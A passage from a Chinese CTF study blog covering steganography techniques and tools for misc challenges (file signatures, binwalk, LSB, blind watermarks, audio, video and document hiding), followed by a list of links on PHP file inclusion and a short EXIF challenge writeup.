<p><a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 音频隐写工具</p>
<p><a class="link"   href="https://www.petitcolas.net/steganography/mp3stego/" >MP3stego <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> MP3音频隐写工具</p>
<p><a class="link"   href="https://www.watermark-software.com/video-to-picture/video-to-picture.html?ins5.3" >videotopicture <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 视频帧的分离工具</p>
<p><a class="link"   href="https://www.bailer.at/wbstego/" >wbStego4.3open <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> PDF文档隐写工具</p>
<h2 id="文件结构类型及识别"><a href="#文件结构类型及识别" class="headerlink" title="文件结构类型及识别"></a>文件结构类型及识别</h2><h3 id="常见文件头和文件尾"><a href="#常见文件头和文件尾" class="headerlink" title="常见文件头和文件尾"></a>常见文件头和文件尾</h3><table>
<thead>
<tr>
<th align="center">文件扩展名</th>
<th align="center">文件头</th>
<th align="center">文件尾</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>JPEG (jpg)</strong></td>
<td align="center"><strong>FF D8 FF</strong></td>
<td align="center"><strong>FF D9</strong></td>
</tr>
<tr>
<td align="center"><strong>PNG (png)</strong></td>
<td align="center"><strong>89 50 4E 47</strong></td>
<td align="center"><strong>AE 42 60 82</strong></td>
</tr>
<tr>
<td align="center"><strong>GIF (gif)</strong></td>
<td align="center"><strong>47 49 46 38</strong></td>
<td align="center"><strong>00 3B</strong></td>
</tr>
<tr>
<td align="center"><strong>ZIP Archive (zip)</strong></td>
<td align="center"><strong>50 4B 03 04</strong></td>
<td align="center"><strong>50 4B</strong></td>
</tr>
<tr>
<td align="center"><strong>RAR Archive (rar)</strong></td>
<td align="center"><strong>52 61 72 21</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Windows Bitmap (bmp)</td>
<td align="center">42 4D</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">XML (xml)</td>
<td align="center">3C 3F 78 6D 6C</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">HTML (html)</td>
<td align="center">68 74 6D 6C 3E</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">MS Word&#x2F;Excel (xls.or.doc)</td>
<td align="center">D0 CF 11 E0</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Adobe Acrobat (pdf)</td>
<td align="center">25 50 44 46 2D 31 2E</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">AVI (avi)</td>
<td align="center">41 56 49 20</td>
<td align="center"></td>
</tr>
</tbody></table>
<blockquote>
<p>在linux中用file命令查看文件类型，windows中用TrlDNET工具进行查看</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240918234041568.png"
                      alt="image-20240918234041568"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240918234142219.png"
                      alt="image-20240918234142219"
                ></p>
<h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><h4 id="附加字符串"><a href="#附加字符串" class="headerlink" title="附加字符串"></a>附加字符串</h4>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>直接将信息写入图片结束符后面，图片识别程序不会识别后面的代码，所以信息能够被隐藏</p>

    </div>
  </div>

<p>用<a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开文件时，直接搜索文本<code>flag,ctf,key</code>等关键词</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919002347396.png"
                      alt="image-20240919002347396"
                ></p>
<h5 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h5>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>将图片文件与其他格式文件结合在一起并保存为图片格式，可以通过修改扩展名来得到其中被隐藏的数据</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919192235889.png"
                      alt="image-20240919192235889"
                ></p>
<p>使用工具<a class="link"   href="https://github.com/ReFirmLabs/binwalk" >Binwalk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（kali）使图种数据分离</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e atta.png --run-as=root</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919002338362.png"
                      alt="image-20240919002338362"
                ></p>
<h5 id="EXIF"><a href="#EXIF" class="headerlink" title="EXIF"></a>EXIF</h5>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>直接在图片属性中添加隐藏信息，这种往往容易被忽视</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919002824284.png"
                      alt="image-20240919002824284"
                ></p>
<h4 id="图片宽高"><a href="#图片宽高" class="headerlink" title="图片宽高"></a>图片宽高</h4><p>对于图片，通过<a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开可以直接修改宽高，但如果要恢复原始比例就需要用到CRC校验码了，涉及到CRC撞库，需要写脚本来实现，并且当源文件过大，则难以枚举</p>
<table>
<thead>
<tr>
<th>内容</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>89 50 4E 47 0D 0A 1A 0A</td>
<td>png的文件头（固定）</td>
</tr>
<tr>
<td>00 00 00 0D</td>
<td>十进制为13，代表头部数据块的长度为13</td>
</tr>
<tr>
<td>49 48 44 52</td>
<td>ASCII码为IHDR，表明数据块为IHDR</td>
</tr>
<tr>
<td>00 00 02 58</td>
<td>图片高度（4bit）（不固定）</td>
</tr>
<tr>
<td>00 00 02 58</td>
<td>图片宽度（4bit）（不固定）</td>
</tr>
<tr>
<td>08 06 00 00 00</td>
<td>依次为Bit depth、ColorType、 Compression method、 Filter method、Interlace method（共5bit）（不固定）</td>
</tr>
<tr>
<td>BE 66 98 DC</td>
<td>CRC校验码（4bit）（固定）</td>
</tr>
</tbody></table>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919010102979.png"
                      alt="image-20240919010102979"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919005014571.png"
                      alt="image-20240919005014571"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919005242860.png"
                      alt="image-20240919005242860"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919005329960.png"
                      alt="image-20240919005329960"
                ></p>
<p>CRC校验码是由从IDCH到THDR的十七位字节进行计算得到，所以说能够反向破解原始宽高</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919010318218.png"
                      alt="image-20240919010318218"
                ></p>
<p><a class="link"   href="http://www.ip33.com/crc.html" >在线CRC计算网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919010356310.png"
                      alt="image-20240919010356310"
                ></p>
<h4 id="最低有效位（LSB）"><a href="#最低有效位（LSB）" class="headerlink" title="最低有效位（LSB）"></a>最低有效位（LSB）</h4>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>改变图片的RGB最低位，使其组合成我们想要隐藏的信息，由于变化太小肉眼无法看出，所以能隐写</p>

    </div>
  </div>

<p>提取隐藏信息需要将RGB的最低位提取出来，重新组合成文件或字符串即可</p>
<p>以下是windows系统的<a class="link"   href="https://github.com/Giotino/stegsolve/tree/v.1.5" >stegsolve <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> LSB工具示例，可以看到多次尝试就可以拿到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919174523222.png"
                      alt="image-20240919174523222"
                ></p>
<h4 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h4><p>这种隐写方式还原需要两张看起来几乎一样的图片，通过比较图片的MD5值或者图片大小可以发现实际是不同的两张图片</p>
<p>使用工具<a class="link"   href="https://github.com/fire-keeper/BlindWatermark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>上面的工具不是本案例提供的，请下载<a class="link"   href="https://github.com/chishaxie/BlindWaterMark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>

  <div class="note p-4 mb-4 rounded-small red">
    <p>我真的服《CTF实战 从入门到提升》这本书了，已经第几次因为提供的案例和工具对不上和浪费了很多时间，真的是作者就不能把工具给完吗，每次试错都搞得我头大（╬￣皿￣） </p>

  </div>

<p>参考系数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>yuantu.png</td>
<td>原来的没有水印的图片</td>
</tr>
<tr>
<td>shuiyintu.png</td>
<td>有水印的图片</td>
</tr>
<tr>
<td>result_1.png</td>
<td>合成的有水印的图片</td>
</tr>
<tr>
<td>result_2.png</td>
<td>提取的水印图片</td>
</tr>
</tbody></table>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 合成盲水印</span></span><br><span class="line">python2 bwm.py encode yuantu.png shuiyintu.png result_1.png</span><br><span class="line"><span class="comment"># 提取盲水印</span></span><br><span class="line">python2 bwm.py encode yuantu.png result_1.png result_2.png</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合成盲水印</span></span><br><span class="line">python3 bwmforpy3.py encode yuantu.png shuiyintu.png result_1.png</span><br><span class="line"><span class="comment"># 提取盲水印</span></span><br><span class="line">python3 bwmforpy3.py encode yuantu.png result_1.png result_2.png</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919185229567.png"
                      alt="image-20240919185229567"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919185257272.png"
                      alt="image-20240919185257272"
                ></p>
<blockquote>
<p>真的服这个作者了(╯‵□′)╯︵ ┴─┴ </p>
</blockquote>
<h3 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h3><h4 id="摩尔斯密码与音频隐写"><a href="#摩尔斯密码与音频隐写" class="headerlink" title="摩尔斯密码与音频隐写"></a>摩尔斯密码与音频隐写</h4><p>在MISC题中打开音频文件若是能听到“滴答”的声音，可以猜测是摩尔斯电码有关</p>

  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>一般不会有这种题，因为没有技术含量还浪费时间</p>

  </div>

<p>使用工具<a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>看音频长短，再对照摩斯密码进行还原</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919195226161.png"
                      alt="image-20240919195226161"
                ></p>
<p>提取出来内容为“..-.  .-..  .-  –.  ..  …  .-  ..  .-.  .-.  ..-  -..  -..  .  .-.”</p>
<blockquote>
<p>这里就不还原为英文字母了</p>
</blockquote>
<h4 id="MP3音频"><a href="#MP3音频" class="headerlink" title="MP3音频"></a>MP3音频</h4>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>采用特殊的量化方法，将数据隐藏在MP3文件的奇偶校验块中</p>

    </div>
  </div>

<p>使用工具<a class="link"   href="https://www.petitcolas.net/steganography/mp3stego/" >MP3stego <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行加密解密（貌似只能加密，我没试出来解密的）</p>
<blockquote>
<p>没有密码只能爆破，密码过于复杂则无法破解</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># —E 读取隐藏信息文件的内容，-P 设置密码</span></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line">decode.exe -E data.txt yuan.wav new.mp3</span><br><span class="line"><span class="comment"># data.txt是加密文件，yuan.wav是原始音频，new.mp3为输出文件</span></span><br><span class="line"><span class="comment"># 然后会需要输入加密的密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">encode.exe -E -P 123456 new.mp3</span><br><span class="line"><span class="comment"># 123456是解密的密码，new.mp3是需要解密的文件</span></span><br></pre></td></tr></table></figure></div>

<h4 id="波形图"><a href="#波形图" class="headerlink" title="波形图"></a>波形图</h4>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>使用工具发现波形规律，将波形转化为01字符串，从而进行编码得到加密内容</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920005827975.png"
                      alt="image-20240920005827975"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920010735736.png"
                      alt="image-20240920010735736"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920012133437.png"
                      alt="image-20240920012133437"
                ></p>
<p>根据正1负0编写二进制代码，再转化为ascii码即可</p>
<p>这里提供一个脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&#x27;your code&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">7</span>):</span><br><span class="line">    res+=<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i:i+<span class="number">7</span>],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure></div>

<h4 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h4><p>音频是一段杂音或者比较刺耳，波形图也没有规律，则可能是频谱图隐写</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920012648185.png"
                      alt="image-20240920012648185"
                ></p>
<p>波形图不连续也没有规律，用频谱图看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920012732399.png"
                      alt="image-20240920012732399"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920012745555.png"
                      alt="image-20240920012745555"
                ></p>
<p>直接就得到flag了，可以作为一个日常判断来做题，拿到音频题就直接看一下频谱图，只需要用手点点就能发现意想不到的东西，岂不美哉≖‿≖✧ </p>
<h3 id="视频隐写"><a href="#视频隐写" class="headerlink" title="视频隐写"></a>视频隐写</h3><h4 id="视频帧的分离"><a href="#视频帧的分离" class="headerlink" title="视频帧的分离"></a>视频帧的分离</h4>
  <div class="note p-4 mb-4 rounded-small blue">
    <p>一般用于综合题目</p>

  </div>

<p>视频题目里面往往会有些隐藏的东西，但由于可能只存在1-2帧的画面，所以单纯截屏或者肉眼是不行的</p>
<p>借助工具<a class="link"   href="https://www.watermark-software.com/video-to-picture/video-to-picture.html?ins5.3" >videotopicture <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行帧分离</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920015652851.png"
                      alt="image-20240920015652851"
                ></p>
<p>可以看到里面有包含二维码的图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/atta044.jpg"
                      alt="atta044"
                ></p>
<h3 id="文档隐写"><a href="#文档隐写" class="headerlink" title="文档隐写"></a>文档隐写</h3><h4 id="Word文档隐写"><a href="#Word文档隐写" class="headerlink" title="Word文档隐写"></a>Word文档隐写</h4><h5 id="改变字体颜色进行隐藏"><a href="#改变字体颜色进行隐藏" class="headerlink" title="改变字体颜色进行隐藏"></a>改变字体颜色进行隐藏</h5>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>将字体颜色修改为和底色（白色）一样的颜色</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920174326354.png"
                      alt="image-20240920174326354"
                ></p>
<p>字体颜色设置为白色</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920174347322.png"
                      alt="image-20240920174347322"
                ></p>
<h5 id="勾选隐藏文字功能进行隐藏"><a href="#勾选隐藏文字功能进行隐藏" class="headerlink" title="勾选隐藏文字功能进行隐藏"></a>勾选隐藏文字功能进行隐藏</h5>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>勾选隐藏文字功能</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920174442092.png"
                      alt="image-20240920174442092"
                ></p>
<blockquote>
<p>这样隐藏后不会被统计字数，但也不好找到隐藏的位置</p>
<p>tips：可以全选然后取消隐藏</p>
</blockquote>
<h5 id="解压docx文档隐藏文件再压缩进行隐藏"><a href="#解压docx文档隐藏文件再压缩进行隐藏" class="headerlink" title="解压docx文档隐藏文件再压缩进行隐藏"></a>解压docx文档隐藏文件再压缩进行隐藏</h5><p>docx文档修改后缀为.zip或者其他格式的压缩包，解压后就可以看到里面是有文件的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920180256951.png"
                      alt="image-20240920180256951"
                ></p>
<h4 id="PDF文档隐写"><a href="#PDF文档隐写" class="headerlink" title="PDF文档隐写"></a>PDF文档隐写</h4><p>对PDF文档的隐写需要用到工具<a class="link"   href="https://www.bailer.at/wbstego/" >wbStego4.3open <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>会将插入的数据中的每一个ASCII码转换为二进制形式，并将其中的0替换成十六进制的20，1替换弄成十六进制中的09，最终将这些转换后的十六进制数据嵌入PDF中</p>
<p>用16进制打开PDF文件发现里面有很多09或者20的字符，可以猜测是PDF隐写</p>

    </div>
  </div>


  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>使用工具进行隐写和解密，需要知道对应的密码，如果题目中没有得到有关密码的提示，则无法进行解密</p>

  </div>

<blockquote>
<p>使用时可能会报错</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240921010247506.png"
                      alt="image-20240921010247506"
                ></p>
<p>当出现上面的情况时，表示数据执行保护被拦截，需要加载打开（原本是为了避免病毒的）</p>
<p>找到“我的电脑”，右击找到“属性”，打开“高级系统设置”，找到“高级”里面的“性能”，打开“设置”，找到“数据执行保护”，根据图中提示，添加“wbStego4.3open.exe”，最后需要重启电脑</p>

  <div class="note p-4 mb-4 rounded-small info fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-info"></i><p>做完题之后可以改回去，需要一直使用请在虚拟机操作</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240921010708361.png"
                      alt="image-20240921010708361"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240921010741505.png"
                      alt="image-20240921010741505"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240921010846336.png"
                      alt="image-20240921010846336"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240921010909324.png"
                      alt="image-20240921010909324"
                ></p>
<p><a class="link"   href="https://www.bailer.at/wbstego/" >wbStego4.3open <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>工具不会用的可以参考<a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/" title="PDF文档隐写-pdf隐写">[PDF文档隐写]pdf隐写</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>隐写术是一个比较混杂的misc安全类，做题时基本是用作其他题型的附加难度，如果题目不提示用隐写术，一定要对图片，音频，视频和文档敏感，不然拿到手都入不了方向</p>
<a href="/2024/09/18/ctf/writeup/misc/%E7%9B%AE%E5%BD%95/catalogue/" title="misc安全目录">参考题目目录</a>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>data</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全学习资料博客文推荐</title>
    <url>/2024/09/14/ctf/data/web/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E5%8D%9A%E5%AE%A2%E6%96%87%E6%8E%A8%E8%8D%90/</url>
    <content><![CDATA[<h1 id="学习资料博客文推荐"><a href="#学习资料博客文推荐" class="headerlink" title="学习资料博客文推荐"></a>学习资料博客文推荐</h1><p>web安全里面有很多各种各样的ctf习题，在遇到一些不会的题的时候往往会去网上查资料，这里盘点了一些做题时遇得到的知识点，可以结合网上资料一起再整理自己的笔记，毕竟自己记过一遍也会更有印象</p>
<h2 id="PHP文件包含漏洞思路与Bypass总结"><a href="#PHP文件包含漏洞思路与Bypass总结" class="headerlink" title="PHP文件包含漏洞思路与Bypass总结"></a>PHP文件包含漏洞思路与Bypass总结</h2><ol>
<li><a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/105839776" >PHP文件包含漏洞利用思路与Bypass总结手册（一） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/106330268?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522A78DF7D0-FFA4-48BA-80E6-B49EF580AC22%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=A78DF7D0-FFA4-48BA-80E6-B49EF580AC22&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-106330268-null-null.nonecase&utm_term=PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B8%8EBypass%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C&spm=1018.2226.3001.4450" >PHP文件包含漏洞利用思路与Bypass总结手册（二） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/106330277?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522A78DF7D0-FFA4-48BA-80E6-B49EF580AC22%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=A78DF7D0-FFA4-48BA-80E6-B49EF580AC22&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-106330277-null-null.nonecase&utm_term=PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B8%8EBypass%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C&spm=1018.2226.3001.4450" >PHP文件包含漏洞利用思路与Bypass总结手册（三） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/106205539?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522A78DF7D0-FFA4-48BA-80E6-B49EF580AC22%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=A78DF7D0-FFA4-48BA-80E6-B49EF580AC22&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-106205539-null-null.nonecase&utm_term=PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B8%8EBypass%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C&spm=1018.2226.3001.4450" >PHP文件包含漏洞利用思路与Bypass总结手册（完结） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ol>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>EXIF</title>
    <url>/2024/09/18/ctf/writeup/misc/buuctf/EXIF/</url>
    <content><![CDATA[<h1 id="EXIF"><a href="#EXIF" class="headerlink" title="EXIF"></a>EXIF</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个图片的附件，将图片另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240918234722257.png"
                      alt="image-20240918234722257"
                ></p>
<p>根据题目提示，这是一道信息隐藏在图片属性的题</p>
<p>直接打开属性即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/EXIF/image-20240919003028368.png"
                      alt="image-20240919003028368"
                ></p>
<p>恭喜，你找到了flag！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一道直接在图片属性中添加隐藏信息，这种往往容易被忽视</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.1%20%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2]EXIF" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>WriteUp</title>
